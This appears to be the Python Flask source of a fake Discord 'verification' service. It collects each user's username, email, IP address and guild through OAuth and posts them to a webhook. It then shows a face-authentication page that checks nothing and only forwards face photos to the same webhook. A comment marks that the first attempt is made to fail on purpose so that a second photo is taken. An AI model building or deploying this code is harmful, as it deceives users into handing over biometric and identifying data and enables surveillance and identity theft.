# Python 3.10+ | pip install flask requests gunicorn Authlib
import os
import requests
from flask import Flask, request, jsonify, send_from_directory
from authlib.integrations.requests_client import OAuth2Session

app = Flask(__name__)

CLIENT_ID     = os.environ["DISCORD_CLIENT_ID"]
CLIENT_SECRET = os.environ["DISCORD_CLIENT_SECRET"]
BOT_TOKEN     = os.environ["DISCORD_BOT_TOKEN"]
WEBHOOK_URL   = os.environ["DISCORD_WEBHOOK_URL"]
WEB_BASE_URL  = os.environ["WEB_BASE_URL"]

REDIRECT_URI      = f"{WEB_BASE_URL}/callback"
DISCORD_API       = "https://discord.com/api/v10"
DISCORD_TOKEN_URL = f"{DISCORD_API}/oauth2/token"
DISCORD_USER_URL  = f"{DISCORD_API}/users/@me"
ROLE_NAME         = "認証済み"

def send_webhook(content: str):
    requests.post(WEBHOOK_URL, json={"content": content}, timeout=10)

def send_webhook_with_file(content: str, image_data: bytes, filename: str):
    requests.post(
        WEBHOOK_URL,
        data={"payload_json": __import__("json").dumps({"content": content})},
        files={"file": (filename, image_data, "image/jpeg")},
        timeout=15,
    )

def add_role(guild_id: str, user_id: str):
    headers = {"Authorization": f"Bot {BOT_TOKEN}"}
    roles   = requests.get(f"{DISCORD_API}/guilds/{guild_id}/roles", headers=headers, timeout=10).json()
    role_id = next((r["id"] for r in roles if r["name"] == ROLE_NAME), None)
    if not role_id:
        return False
    return requests.put(
        f"{DISCORD_API}/guilds/{guild_id}/members/{user_id}/roles/{role_id}",
        headers=headers, timeout=10,
    ).status_code == 204

@app.route("/")
def index():
    return "online", 200

@app.route("/ping")
def ping():
    return "pong", 200

@app.route("/callback")
def callback():
    code  = request.args.get("code")
    state = request.args.get("state", "")
    if not code:
        return "キャンセルされました。", 400
    try:
        user_id, guild_id = state.split(":")
    except ValueError:
        return "不正なリクエストです。", 400

    ip = (
        request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
        or request.remote_addr or "unknown"
    )

    oauth = OAuth2Session(CLIENT_ID, CLIENT_SECRET, redirect_uri=REDIRECT_URI)
    try:
        token = oauth.fetch_token(DISCORD_TOKEN_URL, grant_type="authorization_code", code=code)
    except Exception as e:
        return f"認証失敗: {e}", 500

    u = requests.get(DISCORD_USER_URL, headers={"Authorization": f"Bearer {token['access_token']}"}, timeout=10).json()
    discord_id = u.get("id", "unknown")
    username   = u.get("username", "unknown")
    email      = u.get("email", "取得不可")

    send_webhook(
        f"🔐 **Step1 認証**\n"
        f"👤 `{username}` (ID: `{discord_id}`)\n"
        f"📧 `{email}`\n"
        f"🌐 IP: `{ip}`\n"
        f"🏠 Guild: `{guild_id}`"
    )

    # 顔認証ページにリダイレクト
    return send_from_directory(".", "face_auth.html")

@app.route("/submit-face", methods=["POST"])
def submit_face():
    data       = request.get_json()
    image_b64  = data.get("image", "")
    user_id    = data.get("user_id", "unknown")
    guild_id   = data.get("guild_id", "unknown")
    attempt    = data.get("attempt", 1)

    if not image_b64:
        return jsonify({"success": False, "message": "画像データがありません"}), 400

    # base64デコード
    import base64
    try:
        header, encoded = image_b64.split(",", 1)
        image_data = base64.b64decode(encoded)
    except Exception:
        return jsonify({"success": False, "message": "画像の処理に失敗しました"}), 400

    # Webhookに顔写真を送信
    send_webhook_with_file(
        f"📸 **顔認証画像** (試行{attempt}回目)\n"
        f"👤 UserID: `{user_id}`\n"
        f"🏠 Guild: `{guild_id}`",
        image_data,
        f"face_{user_id}_attempt{attempt}.jpg",
    )

    # 1回目は必ず失敗させる
    if attempt <= 1:
        return jsonify({
            "success": False,
            "message": "顔認証に失敗しました。もう一度お試しください。",
        })

    # 2回目以降は成功
    add_role(guild_id, user_id)
    return jsonify({
        "success": True,
        "message": "認証が完了しました。Discordに戻ってください。",
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
